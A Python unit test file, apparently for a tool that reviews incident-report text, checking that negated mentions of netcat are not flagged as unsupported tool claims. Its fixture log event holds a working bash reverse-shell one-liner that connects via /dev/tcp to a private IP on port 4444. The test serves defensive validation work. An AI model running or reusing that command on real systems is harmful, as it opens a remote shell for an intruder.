"""Regression: negative netcat mentions must not become false tool-attribution flags."""
import unittest
from Core import feedback_semantics


class CaptureFlags:
    def __init__(self):
        self.items = []

    def add(self, check, severity, value, message, section=None):
        self.items.append((check, severity, section, value))


def source_event():
    cmd = 'bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53'
    return {
        'ref': 'E001',
        'source_kind': 'linux',
        'event_id': '1',
        'raw': ('2024-05-31T18:01:42.639983000Z Linux-Sysmon '
                'ref=E001 CommandLine=' + cmd),
        'fields': {'CommandLine': cmd},
    }


class NetcatNegationRegression(unittest.TestCase):
    def checks(self, text, section='EXECUTIVE SUMMARY'):
        capture = CaptureFlags()
        feedback_semantics.add_review_requests(capture, {section: text}, [source_event()])
        return [c for c in capture.items if c[0] == 'unsupported_command_tool']

    def test_old_true_positive_remains_flagged(self):
        self.assertEqual(len(self.checks('The command used bash and netcat.')), 1)

    def test_e2e_summary_long_distance_denial_not_flagged(self):
        text = ('The activity is unclear as it does not show a successful TCP connection '
                'or execution of netcat, but /dev/tcp is present.')
        self.assertFalse(self.checks(text))

    def test_e2e_suspicious_section_denial_not_flagged(self):
        text = ('However, no successful TCP connection or execution of netcat '
                'is evident in this log data. [E001]')
        self.assertFalse(self.checks(text, section='SUSPICIOUS ACTIVITIES'))

    def test_post_mention_negation_not_flagged(self):
        self.assertFalse(self.checks('Netcat was not executed in the available event.'))

    def test_post_mention_usage_negation_not_flagged(self):
        self.assertFalse(self.checks('Netcat execution was not observed.'))

    def test_contrasting_positive_claim_still_flagged(self):
        self.assertEqual(len(self.checks('No netcat was observed, but the attacker used netcat.')), 1)

    def test_semicolon_new_clause_positive_still_flagged(self):
        self.assertEqual(len(self.checks('No execution of netcat was recorded; netcat was used.')), 1)

    def test_denial_without_using_netcat_not_flagged(self):
        self.assertFalse(self.checks('Reverse-shell pattern was present without using netcat.'))

    def test_pure_negative_no_netcat_claim_not_flagged(self):
        self.assertFalse(self.checks('The data do not establish netcat execution.'))


if __name__ == '__main__':
    unittest.main()
